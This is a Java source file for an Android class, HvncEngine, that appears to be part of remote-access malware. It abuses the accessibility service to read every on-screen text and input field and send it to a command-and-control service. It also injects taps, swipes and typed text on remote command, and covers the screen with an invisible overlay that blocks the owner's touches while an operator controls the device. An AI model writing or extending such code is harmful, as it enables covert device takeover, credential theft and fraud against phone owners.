package com.wuzenx.engine;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.WindowManager;
import android.widget.FrameLayout;
import com.wuzenx.C2Service;

public class HvncEngine {
    private AccessibilityService service;
    private C2Service c2;
    private boolean active = false;
    private boolean blockUser = true;
    private Handler handler = new Handler(Looper.getMainLooper());
    private FrameLayout overlay = null;

    public HvncEngine(AccessibilityService service, C2Service c2) {
        this.service = service;
        this.c2 = c2;
    }

    public void start() {
        active = true;
        if (blockUser) showOverlay();
        c2.sendMessage("log", "HVNC started");
        captureScreen();
    }

    public void stop() {
        active = false;
        removeOverlay();
        handler.removeCallbacksAndMessages(null);
    }

    public void setBlockUser(boolean block) {
        blockUser = block;
        if (active) {
            if (block) showOverlay();
            else removeOverlay();
        }
    }

    private void showOverlay() {
        try {
            removeOverlay();
            WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
            overlay = new FrameLayout(service);
            overlay.setBackgroundColor(0x01000000);
            overlay.setClickable(true);
            overlay.setFocusable(true);
            overlay.setOnTouchListener((v, e) -> true);
            
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE;
                
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                android.graphics.PixelFormat.TRANSPARENT);
            
            wm.addView(overlay, params);
        } catch (Exception e) {
            c2.sendMessage("log", "Overlay: " + e.getMessage());
        }
    }

    private void removeOverlay() {
        try {
            if (overlay != null) {
                WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
                wm.removeView(overlay);
                overlay = null;
            }
        } catch (Exception ignored) {}
    }

    public void captureScreen() {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            String dump = dumpTree(root, 0);
            c2.sendMessage("frame", dump);
            root.recycle();
        } catch (Exception ignored) {}
    }

    private String dumpTree(AccessibilityNodeInfo node, int depth) {
        StringBuilder sb = new StringBuilder();
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        String text = node.getText() != null ? node.getText().toString() : "";
        if (node.getContentDescription() != null && text.isEmpty())
            text = node.getContentDescription().toString();
        String cls = node.getClassName() != null ? 
            node.getClassName().toString().replaceAll(".*\\.", "") : "?";
        
        for (int i = 0; i < depth; i++) sb.append("  ");
        sb.append("[").append(cls).append("] \"").append(text.replace("\"", "'"))
          .append("\" [").append(bounds.left).append(",").append(bounds.top)
          .append(",").append(bounds.right).append(",").append(bounds.bottom).append("]");
        if (node.isClickable()) sb.append(" [CLICK]");
        if (node.isEditable()) sb.append(" [EDIT]");
        sb.append("\n");
        
        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    sb.append(dumpTree(child, depth + 1));
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
        return sb.toString();
    }

    public void injectTouch(float xPct, float yPct) {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            Rect bounds = new Rect();
            root.getBoundsInScreen(bounds);
            float ax = bounds.left + (bounds.width() * xPct / 100f);
            float ay = bounds.top + (bounds.height() * yPct / 100f);
            
            Path path = new Path();
            path.moveTo(ax, ay);
            path.lineTo(ax + 0.1f, ay + 0.1f);
            
            service.dispatchGesture(
                new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 50))
                    .build(), null, null);
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void injectSwipe(float x1, float y1, float x2, float y2) {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            Rect bounds = new Rect();
            root.getBoundsInScreen(bounds);
            
            Path path = new Path();
            path.moveTo(bounds.left + bounds.width() * x1 / 100f,
                       bounds.top + bounds.height() * y1 / 100f);
            path.lineTo(bounds.left + bounds.width() * x2 / 100f,
                       bounds.top + bounds.height() * y2 / 100f);
            
            service.dispatchGesture(
                new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                    .build(), null, null);
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void performAction(String action) {
        java.util.Map<String, Integer> map = new java.util.HashMap<>();
        map.put("home", AccessibilityService.GLOBAL_ACTION_HOME);
        map.put("back", AccessibilityService.GLOBAL_ACTION_BACK);
        map.put("recents", AccessibilityService.GLOBAL_ACTION_RECENTS);
        map.put("notifications", AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
        map.put("quick_settings", AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
        map.put("lock", AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
        
        Integer actionId = map.get(action);
        if (actionId != null) service.performGlobalAction(actionId);
    }

    public void typeText(String text) {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) focused = findFirstEditable(root);
            
            if (focused != null) {
                focused.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                android.os.Bundle b = new android.os.Bundle();
                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
                focused.recycle();
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void pressBackspace() {
        performAction("back");
    }

    public void pressEnter() {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused != null) {
                    focused.performAction(AccessibilityNodeInfo.ACTION_IME_ENTER);
                    focused.recycle();
                }
                root.recycle();
            }
        } catch (Exception ignored) {}
    }

    private AccessibilityNodeInfo findFirstEditable(AccessibilityNodeInfo node) {
        if (node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    AccessibilityNodeInfo found = findFirstEditable(child);
                    if (found != null) return found;
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
        return null;
    }
}
